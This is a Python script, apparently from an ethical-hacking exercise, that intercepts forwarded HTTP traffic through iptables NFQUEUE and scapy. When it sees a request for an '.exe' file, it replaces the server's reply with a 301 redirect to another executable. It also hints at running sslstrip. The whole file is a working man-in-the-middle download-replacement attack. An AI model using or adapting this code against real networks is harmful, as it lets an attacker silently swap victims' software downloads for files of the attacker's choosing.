#!/root/anaconda3/bin  python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse

local_computer_test = False


class NetSpoof(object):
    def __init__(self, main_layer, tcp_layer, filter_word, nice_replacement):
        self.check_arguments()
        if self.options.interface:
            self.interface = self.options.interface
        else:
            self.get_interface()
        if self.interface:
            self.spoof_ip = self.get_my_ip()
            self.main_layer = main_layer
            self.tcp_layer = tcp_layer
            self.filter_word = filter_word
            self.ack_list = set()
            self.dickens_bait = nice_replacement

    def check_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-i", "--interface", dest="interface",
                          help="Interface name to work with it for spoofing.")

        (self.options, arguments) = parser.parse_args()
        return self.options

    def get_interface(self):
        machine_data = str(subprocess.check_output(
            r"ifconfig | sed 's/^\(.*\): /\1---\n/g' | sed 's/\s*\(ether.*\)/\1---/g' | sed -n '/.*---/p' | sed 's/---// g'", shell=True)).replace(r"b'", '').replace("'", '').split(r'\n')[:-1]

        start = 1
        relevant_interfaces = {}

        while start < len(machine_data):
            if 'ether' in machine_data[start]:
                relevant_interfaces[start] = machine_data[start - 1]
            start += 1

        print(
            f"\nThose are available interfaces:{relevant_interfaces}\nPlease choose the interface by index.Insert the number:")

        try:
            self.interface = relevant_interfaces[int(input())]
        except KeyError:
            print('Interface does not exist!!')
            return None
        return self.interface

    def get_my_ip(self):
        return str(subprocess.check_output(
            r"ip route  |  sed -n '/" + self.interface + ".*kernel/ p' | awk '{print $9; exit}'", shell=True)).replace("b'", '').replace(r"\n'", '')

    def set_load(self, packet):
        packet[scapy.Raw].load = self.dickens_bait
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[self.tcp_layer].chksum
        print(packet.show())
        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(self.main_layer):
            try:
                if scapy_packet[self.tcp_layer].dport == 80:
                    if self.filter_word in str(scapy_packet[self.main_layer].load):
                        print(str(scapy_packet[self.main_layer].load))
                        print('[+] exe Request')
                        self.ack_list.add(scapy_packet[self.tcp_layer].ack)
                        print(scapy_packet.show())
                elif scapy_packet[self.tcp_layer].sport == 80:
                    if scapy_packet[self.tcp_layer].seq in self.ack_list:
                        self.ack_list.remove(scapy_packet[self.tcp_layer].seq)
                        print('[+] Replacing file.')
                        modified_packet = self.set_load(scapy_packet)
                        packet.set_payload(bytes(modified_packet))
            except IndexError:
                pass

        packet.accept()


if __name__ == '__main__':

    if local_computer_test:
        subprocess.call(
            r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
        subprocess.call(
            r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    else:
        subprocess.call(
            r'iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    try:
        sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
                          "HTTP/1.1 301 Moved Permanenty\nLocation: https://www.rarlab.com/rar/winrar-x64-590cz.exe\n\n")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, sp_obj.process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(r'iptables --flush', shell=True)

#python $(locate sslstrip.py | sed -n '/0.9/ p')